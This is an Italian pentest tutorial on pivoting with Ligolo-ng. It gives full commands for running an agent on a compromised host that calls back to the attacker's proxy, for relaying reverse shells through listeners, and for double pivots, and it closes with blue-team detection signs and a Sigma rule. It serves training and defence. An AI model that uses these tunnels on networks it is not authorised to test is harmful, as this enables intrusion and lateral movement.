---
title: 'Ligolo-ng: tunneling e pivoting senza proxychains su Kali'
slug: ligolo-ng
description: >-
  Ligolo-ng è il tool di tunneling e pivoting con interfaccia TUN: uso,
  installazione, proxy e agent, double pivot, Magic IP e come rilevarlo. Guida
  per pentest.
image: /ligolo-ng-tunneling-pivoting-tool.webp
draft: false
date: 2026-11-02T15:35:59.881Z
categories:
  - tools
subcategories:
  - post-exploit
tags:
  - Ligolo-ng
  - Network Tunneling
  - Network Pivoting
  - Port Forwarding
  - Pivoting Techniques
---

# Ligolo-ng: guida al pivoting con interfaccia TUN, senza proxychains

**Ligolo-ng** è un tool di pivoting che crea un'interfaccia TUN sul tuo Kali e ti fa usare nmap, NetExec, ssh e curl dentro una rete interna, senza proxychains. Serve quando compromettiamo una macchina che vede una rete interna: i nostri tool girano sul Kali, non sulla macchina compromessa, e ci vuole un **tunnel** che porti il traffico dentro. Questa tecnica si chiama **pivoting**.

In questa guida vediamo cos'è Ligolo-ng, come funziona, come si installa e si usa passo passo (proxy e agent, anche su Windows), come fare un **double pivot**, come si confronta con Chisel e, lato difesa, come riconoscerlo sulla rete. Trovi anche **[myligolo](https://github.com/hack-ita/myligolo)**, il nostro launcher open source che prepara interfacce, proxy e comandi in un solo comando.

## Cos'è Ligolo-ng

Ligolo-ng è un tool di **tunneling e pivoting** open source che usa un'**interfaccia TUN**. In pratica crea sul tuo Kali una scheda di rete virtuale: tutto il traffico che mandi verso la rete interna passa da lì e arriva sull'agent, che lo esegue dentro la rete della vittima.

Il vantaggio rispetto ai metodi classici è uno solo, ma enorme: **non serve nessun proxy SOCKS**. Con SOCKS devi mettere `proxychains` davanti a ogni comando e molti tool non lo gradiscono. Con Ligolo-ng lanci `nmap` o `nxc` come se fossi già dentro la rete.

Le caratteristiche principali, secondo il README ufficiale:

* tunnel su connessione **reverse TCP/TLS**, senza SOCKS;
* **l'agent non richiede privilegi di amministratore o root**: serve solo al proxy, sul tuo Kali, per creare l'interfaccia TUN;
* scelta dell'agent e informazioni di rete da una console semplice;
* multiplexing, più tunnel contemporanei, agent per più piattaforme;
* connessioni reverse e bind, listener sull'agent;
* recupero automatico di tunnel e listener, supporto WebSocket.

Le versioni più recenti (0.8 in poi) aggiungono API e interfaccia web, file di configurazione, modalità daemon, auto-bind e gestione automatica delle route.

## Come funziona

Ligolo-ng ha due componenti:

* il **proxy** gira sulla tua macchina d'attacco e ascolta le connessioni;
* l'**agent** gira sulla macchina compromessa (il "pivot") e si collega al proxy, quindi la connessione parte **dall'interno verso l'esterno**: passa più facilmente i firewall.

![Ligolo-ng pivoting with a TUN interface](data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMTAwMCA0MjAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgZm9udC1mYW1pbHk9IkFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWYiPgogIDxkZWZzPgogICAgPG1hcmtlciBpZD0iYXJyb3ciIHZpZXdCb3g9IjAgMCAxMCAxMCIgcmVmWD0iOSIgcmVmWT0iNSIgbWFya2VyV2lkdGg9IjgiIG1hcmtlckhlaWdodD0iOCIgb3JpZW50PSJhdXRvLXN0YXJ0LXJldmVyc2UiPgogICAgICA8cGF0aCBkPSJNMCwwIEwxMCw1IEwwLDEwIHoiIGZpbGw9IiNmZmZmZmYiLz4KICAgIDwvbWFya2VyPgogICAgPG1hcmtlciBpZD0iYXJyb3dSZWQiIHZpZXdCb3g9IjAgMCAxMCAxMCIgcmVmWD0iOSIgcmVmWT0iNSIgbWFya2VyV2lkdGg9IjgiIG1hcmtlckhlaWdodD0iOCIgb3JpZW50PSJhdXRvLXN0YXJ0LXJldmVyc2UiPgogICAgICA8cGF0aCBkPSJNMCwwIEwxMCw1IEwwLDEwIHoiIGZpbGw9IiNmZjAxMDMiLz4KICAgIDwvbWFya2VyPgogIDwvZGVmcz4KICA8cmVjdCB4PSIwIiB5PSIwIiB3aWR0aD0iMTAwMCIgaGVpZ2h0PSI0MjAiIGZpbGw9IiM2YjAwMDEiLz4KICA8dGV4dCB4PSIzMCIgeT0iNDYiIGZvbnQtc2l6ZT0iMjIiIGZvbnQtd2VpZ2h0PSI3MDAiIGZpbGw9IiNmZmZmZmYiPkxpZ29sby1uZzogcGl2b3Rpbmcgd2l0aCBhIFRVTiBpbnRlcmZhY2U8L3RleHQ+CiAgPHJlY3QgeD0iMzAiIHk9IjgwIiB3aWR0aD0iMjIwIiBoZWlnaHQ9IjE3MCIgcng9IjgiIGZpbGw9IiMwMDAwMDAiIHN0cm9rZT0iI2ZmMDEwMyIgc3Ryb2tlLXdpZHRoPSIyIi8+CiAgPHRleHQgeD0iNTAiIHk9IjExMCIgZm9udC1zaXplPSIxMyIgZm9udC13ZWlnaHQ9IjcwMCIgZmlsbD0iI2ZmMDEwMyI+QVRUQUNLRVI8L3RleHQ+CiAgPHRleHQgeD0iNTAiIHk9IjE0MCIgZm9udC1zaXplPSIxNSIgZm9udC13ZWlnaHQ9IjYwMCIgZmlsbD0iI2ZmZmZmZiI+bGlnb2xvLXByb3h5IGxpc3RlbnM8L3RleHQ+CiAgPHRleHQgeD0iNTAiIHk9IjE2MiIgZm9udC1zaXplPSIxNSIgZm9udC13ZWlnaHQ9IjYwMCIgZmlsbD0iI2ZmZmZmZiI+b24gcG9ydCAxMTYwMTwvdGV4dD4KICA8dGV4dCB4PSI1MCIgeT0iMTkyIiBmb250LXNpemU9IjE1IiBmb250LXdlaWdodD0iNjAwIiBmaWxsPSIjZmZmZmZmIj5UVU4gaW50ZXJmYWNlOiBsaWdvbG88L3RleHQ+CiAgPHRleHQgeD0iNTAiIHk9IjIxNCIgZm9udC1zaXplPSIxNSIgZm9udC13ZWlnaHQ9IjYwMCIgZmlsbD0iI2ZmZmZmZiI+cm91dGU6IDEwLjEwLjEwLjAvMjQ8L3RleHQ+CiAgPHJlY3QgeD0iMzgwIiB5PSI4MCIgd2lkdGg9IjIyMCIgaGVpZ2h0PSIxNzAiIHJ4PSI4IiBmaWxsPSIjMDAwMDAwIiBzdHJva2U9IiNmZjAxMDMiIHN0cm9rZS13aWR0aD0iMiIvPgogIDx0ZXh0IHg9IjQwMCIgeT0iMTEwIiBmb250LXNpemU9IjEzIiBmb250LXdlaWdodD0iNzAwIiBmaWxsPSIjZmYwMTAzIj5QSVZPVCBIT1NUPC90ZXh0PgogIDx0ZXh0IHg9IjQwMCIgeT0iMTQwIiBmb250LXNpemU9IjE1IiBmb250LXdlaWdodD0iNjAwIiBmaWxsPSIjZmZmZmZmIj5saWdvbG8gYWdlbnQgcnVucyBoZXJlPC90ZXh0PgogIDx0ZXh0IHg9IjQwMCIgeT0iMTYyIiBmb250LXNpemU9IjE1IiBmb250LXdlaWdodD0iNjAwIiBmaWxsPSIjZmZmZmZmIj5ObyByb290IG5lZWRlZDwvdGV4dD4KICA8dGV4dCB4PSI0MDAiIHk9IjE5MiIgZm9udC1zaXplPSIxNSIgZm9udC13ZWlnaHQ9IjYwMCIgZmlsbD0iI2ZmZmZmZiI+U2VlcyBib3RoIG5ldHdvcmtzPC90ZXh0PgogIDxyZWN0IHg9IjczMCIgeT0iODAiIHdpZHRoPSIyNDAiIGhlaWdodD0iMTcwIiByeD0iOCIgZmlsbD0iIzAwMDAwMCIgc3Ryb2tlPSIjZmYwMTAzIiBzdHJva2Utd2lkdGg9IjIiLz4KICA8dGV4dCB4PSI3NTAiIHk9IjExMCIgZm9udC1zaXplPSIxMyIgZm9udC13ZWlnaHQ9IjcwMCIgZmlsbD0iI2ZmMDEwMyI+SU5URVJOQUwgTkVUV09SSzwvdGV4dD4KICA8dGV4dCB4PSI3NTAiIHk9IjE0MCIgZm9udC1zaXplPSIxNSIgZm9udC13ZWlnaHQ9IjYwMCIgZmlsbD0iI2ZmZmZmZiI+MTAuMTAuMTAuMC8yNDwvdGV4dD4KICA8dGV4dCB4PSI3NTAiIHk9IjE3MCIgZm9udC1zaXplPSIxNSIgZm9udC13ZWlnaHQ9IjYwMCIgZmlsbD0iI2ZmZmZmZiI+Tm90IHJlYWNoYWJsZSBmcm9tPC90ZXh0PgogIDx0ZXh0IHg9Ijc1MCIgeT0iMTkyIiBmb250LXNpemU9IjE1IiBmb250LXdlaWdodD0iNjAwIiBmaWxsPSIjZmZmZmZmIj50aGUgb3V0c2lkZTwvdGV4dD4KICA8dGV4dCB4PSIzMTUiIHk9IjE1MCIgZm9udC1zaXplPSIxMyIgZm9udC13ZWlnaHQ9IjYwMCIgZmlsbD0iI2ZmZmZmZiIgdGV4dC1hbmNob3I9Im1pZGRsZSI+UmV2ZXJzZSBUTFM8L3RleHQ+CiAgPHRleHQgeD0iMzE1IiB5PSIxNjgiIGZvbnQtc2l6ZT0iMTMiIGZvbnQtd2VpZ2h0PSI2MDAiIGZpbGw9IiNmZmZmZmYiIHRleHQtYW5jaG9yPSJtaWRkbGUiPmNvbm5lY3Rpb248L3RleHQ+CiAgPGxpbmUgeDE9IjM4MCIgeTE9IjE4NSIgeDI9IjI1MiIgeTI9IjE4NSIgc3Ryb2tlPSIjZmYwMTAzIiBzdHJva2Utd2lkdGg9IjMiIG1hcmtlci1lbmQ9InVybCgjYXJyb3dSZWQpIi8+CiAgPHRleHQgeD0iNjY1IiB5PSIxNTAiIGZvbnQtc2l6ZT0iMTMiIGZvbnQtd2VpZ2h0PSI2MDAiIGZpbGw9IiNmZmZmZmYiIHRleHQtYW5jaG9yPSJtaWRkbGUiPkZvcndhcmRzIHRoZTwvdGV4dD4KICA8dGV4dCB4PSI2NjUiIHk9IjE2OCIgZm9udC1zaXplPSIxMyIgZm9udC13ZWlnaHQ9IjYwMCIgZmlsbD0iI2ZmZmZmZiIgdGV4dC1hbmNob3I9Im1pZGRsZSI+cmVhbCB0cmFmZmljPC90ZXh0PgogIDxsaW5lIHgxPSI2MDAiIHkxPSIxODUiIHgyPSI3MjgiIHkyPSIxODUiIHN0cm9rZT0iI2ZmZmZmZiIgc3Ryb2tlLXdpZHRoPSIyIiBtYXJrZXItZW5kPSJ1cmwoI2Fycm93KSIvPgogIDxsaW5lIHgxPSIxNDAiIHkxPSIyNTAiIHgyPSIxNDAiIHkyPSIyOTgiIHN0cm9rZT0iI2ZmZmZmZiIgc3Ryb2tlLXdpZHRoPSIyIiBtYXJrZXItZW5kPSJ1cmwoI2Fycm93KSIvPgogIDxyZWN0IHg9IjMwIiB5PSIzMDAiIHdpZHRoPSI5NDAiIGhlaWdodD0iODQiIHJ4PSI4IiBmaWxsPSIjMDAwMDAwIiBzdHJva2U9IiNmZjAxMDMiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWRhc2hhcnJheT0iNiw0Ii8+CiAgPHRleHQgeD0iNTAiIHk9IjMzMiIgZm9udC1zaXplPSIxMyIgZm9udC13ZWlnaHQ9IjcwMCIgZmlsbD0iI2ZmMDEwMyI+WU9VUiBUT09MUzwvdGV4dD4KICA8dGV4dCB4PSI1MCIgeT0iMzYwIiBmb250LXNpemU9IjE2IiBmb250LXdlaWdodD0iNjAwIiBmaWxsPSIjZmZmZmZmIj5ubWFwLCBuZXRleGVjLCBzc2ggYW5kIGN1cmwgdXNlIHRoZSBsaWdvbG8gaW50ZXJmYWNlIGFuZCByZWFjaCAxMC4xMC4xMC4wLzI0IGRpcmVjdGx5LCBubyBwcm94eWNoYWluczwvdGV4dD4KPC9zdmc+Cg==)

Dietro le quinte il proxy usa uno stack di rete in user space basato su gVisor. Quando mandi un pacchetto TCP verso la rete interna, il proxy lo traduce e l'agent apre una vera connessione verso la destinazione. Se la connessione riesce, il SYN-ACK torna indietro. Per questo, con nmap, in laboratorio conviene usare una scansione `-sT` e `-Pn`: l'agent trasforma i SYN in connessioni complete.

## Installazione: proxy e agent

Su **Kali Linux** il pacchetto è già disponibile:

```bash
# Installs ligolo-proxy and ligolo-agent
sudo apt install ligolo-ng
```

Il pacchetto di Kali (versione 0.9.1 al momento in cui scrivo) installa due comandi: `ligolo-proxy` e `ligolo-agent`.

In alternativa scarichi i binari dalle **ligolo-ng releases** su GitHub (repository [nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)): servono il `proxy` per la tua macchina e l'`agent` per il sistema di destinazione (Linux o Windows, a seconda del target). L'agent per Windows è un `agent.exe`.

## Come si usa Ligolo-ng, passo passo

Facciamo un esempio concreto. Il nostro Kali è `10.10.14.5`, il pivot ha due schede di rete e vede la rete `10.10.10.0/24`.

**1. Avvia il proxy sul Kali**

```bash
# Self-signed certificate, listens on the default port 11601
sudo ligolo-proxy -selfcert
```

Il proxy si mette in ascolto sulla porta 11601. `-selfcert` genera un certificato TLS autofirmato.

**2. Avvia l'agent sul pivot**

```bash
# Linux pivot: connects back to the proxy
./agent -connect 10.10.14.5:11601 -ignore-cert
```

```cmd
:: Windows pivot
agent.exe -connect 10.10.14.5:11601 -ignore-cert
```

`-ignore-cert` serve ad accettare il certificato autofirmato del proxy. Nella console del proxy comparirà la nuova connessione.

**3. Scegli la sessione, crea l'interfaccia e la route**

Nella console di Ligolo-ng:

```text
session
interface_create --name ligolo
route_add --name ligolo --route 10.10.10.0/24
tunnel_start --tun ligolo
```

Con `session` scegli l'agent. `interface_create` crea la scheda TUN, `route_add` dice al sistema che la rete `10.10.10.0/24` si raggiunge da lì, e `tunnel_start` avvia il tunnel. Se preferisci fare tutto a mano, i comandi equivalenti sul Kali sono:

```bash
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 10.10.10.0/24 dev ligolo
```

Questi passaggi si ripetono identici a ogni lab. Se vuoi saltarli, **[myligolo](https://github.com/hack-ita/myligolo)** crea le interfacce, avvia il proxy e ti stampa già tutti i comandi: lo trovi spiegato più sotto.

**4. Usa i tool normalmente**

Da questo momento la rete interna è raggiungibile dal tuo terminale, senza `proxychains`:

```bash
# Full TCP connect scan, no ping
nmap -sT -Pn -p 22,80,445 10.10.10.5

# Any tool works as if you were inside the network
nxc smb 10.10.10.0/24
```

Per scansioni ed enumerazione, i due articoli di riferimento sono [nmap](https://hackita.it/articoli/nmap/) e [NetExec](https://hackita.it/articoli/netexec/).

## Il Magic IP 240.0.0.1: raggiungere il localhost dell'agent

A volte il servizio che ti interessa ascolta solo su `127.0.0.1` del pivot, per esempio un database locale. Ligolo-ng ha un indirizzo speciale per questo caso, il **Magic IP `240.0.0.1`**, introdotto dalla versione 0.5.1. Il traffico verso `240.0.0.1` arriva al `127.0.0.1` della macchina dove gira l'agent.

```bash
sudo ip route add 240.0.0.1/32 dev ligolo
```

```bash
# Reaches MySQL listening only on the pivot's localhost
mysql -h 240.0.0.1 -P 3306 -u root -p
```

## Listener: tunnel inverso per reverse shell e file

Il tunnel normale porta il traffico dal tuo Kali verso la rete interna. A volte serve il contrario: una macchina interna deve raggiungere te, per esempio per una reverse shell o per scaricare un file. Per questo ci sono i **listener** sull'agent:

```text
listener_add --addr 0.0.0.0:4444 --to 10.10.14.5:4444
listener_list
```

L'agent ascolta sulla porta 4444 del pivot e inoltra le connessioni al tuo Kali. Le macchine interne si collegano all'IP del pivot e tu ricevi la shell in locale.

## Double pivot: una seconda rete dietro la prima

Può succedere che dal primo pivot si raggiunga un secondo host con un'altra rete dietro. Con Ligolo-ng si fa così:

1. Sul primo agent crei un listener che inoltra la porta 11601 al tuo proxy:

```text
listener_add --addr 0.0.0.0:11601 --to 10.10.14.5:11601
```

1. Sul secondo host avvii l'agent collegandolo all'**IP interno del primo pivot**, non al tuo:

```bash
./agent -connect 10.10.10.5:11601 -ignore-cert
```

1. Nella console scegli la nuova sessione e ripeti il giro con una seconda interfaccia e una seconda rete:

```text
session
interface_create --name ligolo2
route_add --name ligolo2 --route 192.168.50.0/24
tunnel_start --tun ligolo2
```

Per la teoria generale dei salti tra reti trovi la guida al [pivoting](https://hackita.it/articoli/pivoting/) e quella al [lateral movement](https://hackita.it/articoli/lateral-movement/).

## myligolo: il launcher di Hackita per Ligolo-ng

In ogni lab si ripete lo stesso giro: creare l'interfaccia TUN, alzarla, ricordarsi la porta, scrivere le route, copiare il comando dell'agent. Sono passaggi semplici, ma sbagliarne uno ti fa perdere minuti a capire perché il tunnel non passa traffico.

Per questo abbiamo scritto **[myligolo](https://github.com/hack-ita/myligolo)**, un launcher open source in Python che fa tutta la preparazione con un solo comando:

```bash
# Clone the launcher
git clone https://github.com/hack-ita/myligolo
cd myligolo

# Default port 11601
sudo python3 myligolo.py

# Custom port
sudo python3 myligolo.py 4444
```

I vantaggi rispetto al fare tutto a mano:

* **Un comando e sei pronto**: crea le interfacce TUN e avvia `ligolo-proxy -selfcert` sulla porta che scegli (di default la 11601).
* **Fino a 10 interfacce già pronte**: `ligolo`, `ligolo2`, `ligolo3`, fino a `ligolo10`. Quelle già esistenti vengono saltate, quindi il **double pivot** e il triple pivot non richiedono di ricreare niente.
* **I comandi giusti, già scritti**: stampa i comandi della console del proxy (`session` e `start`), le `ip route` per la rete interna e per il **Magic IP `240.0.0.1`**, e il comando dell'agent da incollare sul target, con la tua porta già dentro.
* **Meno errori stupidi**: niente interfaccia dimenticata, niente route sbagliata, niente porta diversa tra proxy e agent. Sono gli errori che nei lab fanno perdere più tempo.
* **Controlla che il proxy ci sia**: se `ligolo-proxy` non è nel `PATH`, te lo dice e ti indica dove scaricarlo.
* **Zero dipendenze**: usa solo la libreria standard di Python 3, quindi funziona su qualsiasi Kali senza installare niente.

Dopo l'avvio fai solo questo. Nella console del proxy:

```text
session
start
```

E in un altro terminale aggiungi la route verso la rete interna:

```bash
# Internal network through the first interface
sudo ip route add 10.10.10.0/24 dev ligolo
```

Per un secondo pivot basta passare a `ligolo2` e a una seconda rete: l'interfaccia è già lì che aspetta.

myligolo è pensato per CTF, laboratori Hack The Box e test autorizzati, ed è il modo più veloce che conosciamo per mettere in piedi Ligolo-ng senza dimenticare niente. Il codice è su GitHub: [github.com/hack-ita/myligolo](https://github.com/hack-ita/myligolo). Se ti è utile, lascia una stella al repository.

## Ligolo-ng vs Chisel e altri tool di pivoting

La domanda classica è "Ligolo-ng o Chisel?". Dipende da cosa devi fare:

| Tool      | Come porta il traffico       | SOCKS       | Interfaccia TUN | WebSocket |
| --------- | ---------------------------- | ----------- | --------------- | --------- |
| Ligolo-ng | Interfaccia TUN sul tuo Kali | No          | Sì              | Sì        |
| Chisel    | Tunnel su HTTP o WebSocket   | Sì (SOCKS5) | No              | Sì        |
| SSH       | Port forwarding o `-D`       | Sì          | No              | No        |

* **Ligolo-ng** è la scelta migliore quando vuoi usare i tool normalmente, senza `proxychains`, e hai accesso a un agent che si collega al tuo proxy.
* **[Chisel](https://hackita.it/articoli/chisel/)** è utile quando ti serve un SOCKS5 o devi passare da un canale HTTP.
* **[SSH](https://hackita.it/articoli/ssh/)** resta il metodo più semplice se hai già credenziali valide sul pivot.
* **[Proxychains](https://hackita.it/articoli/proxychains/)** non è un tunnel: è il wrapper che fa passare i comandi dal proxy SOCKS, ed è proprio quello che con Ligolo-ng non ti serve più.

Un caso a parte: se la porta d'ingresso è un proxy Squid mal configurato, il pivoting si fa con il metodo `CONNECT`: lo trovi nell'articolo su [Squid porta 3128](https://hackita.it/articoli/porta-3128-squid-proxy/), con il nostro scanner `mysquidscanner`.

## Errori comuni

* **Il tunnel non passa traffico**: hai dimenticato `tunnel_start` o la route. Controlla con `ip route` che la rete punti all'interfaccia `ligolo`.
* **L'agent non si collega**: il firewall blocca la porta 11601 in uscita, oppure hai dimenticato `-ignore-cert` con il certificato autofirmato. Puoi cambiare porta con `-laddr` sul proxy.
* **Ping e scansioni SYN danno risultati strani**: usa `nmap -sT -Pn`.
* **Non raggiungi i servizi su localhost del pivot**: serve la route verso `240.0.0.1/32`.
* **Più reti, una sola interfaccia**: usa un'interfaccia per ogni sessione (`ligolo`, `ligolo2`, ...).

## Come rilevare Ligolo-ng (blue team)

Ligolo-ng sul target è un solo binario che apre una connessione in uscita. Questi segnali aiutano:

* **connessioni in uscita** da un server interno verso un IP esterno sulla **porta 11601**, che è la porta di default, con TLS e certificato autofirmato;
* **processi con riga di comando** che contiene `-connect` e `-ignore-cert`;
* binari chiamati `agent` o `agent.exe` in cartelle temporanee o nel profilo utente;
* sul target l'agent non crea interfacce di rete e non richiede privilegi alti, quindi i segnali da cercare sono processo e connessione, non la configurazione di rete.

Una regola Sigma di partenza sulla riga di comando:

```yaml
title: Ligolo-ng Agent Execution Command Line
id: 60dc6b0a-2d5c-4e9e-9c6d-5b8b2a9d7c11
status: experimental
description: Detects the Ligolo-ng agent started with its typical connect and ignore-cert flags
author: Hackita
date: 2026/11/01
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    CommandLine|contains|all:
      - '-connect'
      - '-ignore-cert'
  condition: selection
falsepositives:
  - Administrative scripts that use the same flag names
level: medium
```

Sul piano della prevenzione funziona soprattutto il **filtraggio in uscita**: i server non devono poter aprire connessioni verso Internet su porte arbitrarie. Aggiungi l'ispezione del traffico TLS verso destinazioni sconosciute e un controllo sugli eseguibili che partono da cartelle temporanee, e il tunnel diventa molto più difficile da piazzare.

## Domande frequenti

### Cos'è Ligolo-ng?

È un tool open source di tunneling e pivoting che crea un'interfaccia TUN sulla macchina dell'attaccante e collega, tramite una connessione reverse TLS, un agent installato su una macchina che vede la rete interna.

### Cos'è myligolo?

È il launcher open source di Hackita per Ligolo-ng: con `sudo python3 myligolo.py` crea fino a 10 interfacce TUN, avvia `ligolo-proxy` sulla porta che scegli e stampa i comandi per il proxy, per le route e per l'agent. Il codice è su [GitHub](https://github.com/hack-ita/myligolo).

### Ligolo-ng è meglio di Chisel?

Dipende dal caso. Ligolo-ng è più comodo perché non richiede proxychains e i tool funzionano normalmente. Chisel offre un proxy SOCKS5 ed è utile quando devi passare attraverso HTTP o quando un'interfaccia TUN non è possibile.

### Serve essere root per usare Ligolo-ng?

Sul tuo Kali sì, perché il proxy crea l'interfaccia TUN. Sul target no: l'agent non richiede privilegi di amministratore o root.

### Ligolo-ng funziona su Windows?

Sì, l'agent esiste per Windows (`agent.exe`) e si avvia con `-connect` e `-ignore-cert`. Il proxy gira sul tuo Linux.

### Qual è la porta predefinita di Ligolo-ng?

La porta di default del proxy è la 11601. Si può cambiare, per esempio con `-laddr 0.0.0.0:443`.

### Cos'è il Magic IP 240.0.0.1 di Ligolo-ng?

È un indirizzo speciale: il traffico verso `240.0.0.1` arriva al `127.0.0.1` della macchina dove gira l'agent, utile per i servizi che ascoltano solo in locale.

### Ligolo-ng si usa per OSCP e per i lab Hack The Box?

È uno dei tool di pivoting più usati nei lab, perché evita proxychains e funziona bene con nmap e NetExec. Come sempre, usalo solo su sistemi che sei autorizzato a testare.

## Riepilogo operativo

* Ligolo-ng crea un'interfaccia TUN sul tuo Kali: nessun SOCKS, nessun proxychains.
* Il proxy gira da te, l'agent sul pivot, e la connessione parte dal pivot verso di te (reverse TLS, porta 11601).
* Passi: `ligolo-proxy -selfcert`, agent con `-connect` e `-ignore-cert`, poi `session`, `interface_create`, `route_add` e `tunnel_start`.
* `240.0.0.1` raggiunge il localhost del pivot, `listener_add` serve per reverse shell e file, il double pivot usa un listener sul primo agent.
* Con **myligolo** salti la preparazione: un comando crea le interfacce, avvia il proxy e stampa route e comando dell'agent.
* In difesa guarda le connessioni in uscita sulla porta 11601 e le righe di comando con `-connect` e `-ignore-cert`.

Ligolo-ng è uno strumento della fase di [post-exploitation](https://hackita.it/articoli/post-exploitation/): una volta capito come funziona, ogni lab con più reti diventa molto più semplice da gestire. Il launcher [myligolo](https://github.com/hack-ita/myligolo) ti fa partire in un comando.
